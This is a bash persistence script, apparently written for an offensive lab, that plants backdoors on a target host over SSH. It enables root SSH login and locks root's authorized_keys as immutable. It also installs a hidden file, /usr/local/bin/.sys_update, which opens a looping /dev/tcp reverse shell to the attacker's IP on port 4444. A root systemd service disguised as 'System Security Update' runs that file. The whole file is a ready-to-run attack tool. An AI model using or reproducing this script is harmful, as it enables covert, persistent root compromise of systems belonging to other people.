#!/bin/bash

# 1. Gather Target Information
echo "--- SSH & Systemd Integrated Persistence ---"
read -p "Enter Target IP: " TARGET_IP
read -p "Enter Target Username (e.g., kali/admin): " TARGET_USER
read -p "Enter Your Parrot IP (for reverse shell): " LOCAL_IP
echo "--------------------------------------------"

# 2. Ensure Local Key Exists
if [ ! -f ~/.ssh/id_ed25519 ]; then
    echo "[+] Generating local Ed25519 key..."
    ssh-keygen -t ed25519 -N "" -f ~/.ssh/id_ed25519
fi

# 3. Copy Key to the Standard User
echo "[+] Step 1: Sending public key to $TARGET_USER..."
ssh-copy-id -i ~/.ssh/id_ed25519.pub "$TARGET_USER@$TARGET_IP"

# 4. Configure Root SSH and Systemd Backdoor
echo "[+] Step 2: Escalating for Deep Persistence..."
ssh -t "$TARGET_USER@$TARGET_IP" "
    # --- SSH Persistence with Immutable Lock ---
    echo '[*] Configuring Root SSH Access...' && \
    sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config && \
    sudo mkdir -p /root/.ssh && \
    sudo cp ~/.ssh/authorized_keys /root/.ssh/authorized_keys && \
    sudo chmod 700 /root/.ssh && \
    sudo chmod 600 /root/.ssh/authorized_keys && \
    echo '[*] Applying Immutable Lock (+i)...' && \
    sudo chattr +i /root/.ssh/authorized_keys && \

    # --- Systemd Backdoor Section ---
    echo '[*] Creating Systemd Hidden Backdoor...' && \
    echo '#!/bin/bash
while true; do
    bash -i >& /dev/tcp/$LOCAL_IP/4444 0>&1
    sleep 60
done' | sudo tee /usr/local/bin/.sys_update > /dev/null && \
    sudo chmod +x /usr/local/bin/.sys_update && \
    
    echo '[Unit]
Description=System Security Update
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/.sys_update
Restart=always

[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/sys-update.service > /dev/null && \

    echo '[*] Enabling and Starting Service...' && \
    sudo systemctl daemon-reload && \
    sudo systemctl enable sys-update.service && \
    sudo systemctl start sys-update.service && \
    
    echo '[*] Restarting SSH Service...' && \
    sudo systemctl restart ssh
"

echo -e "\n[***] SETUP COMPLETE!"
echo "[+] Target is now locked with +i and a reverse shell service."
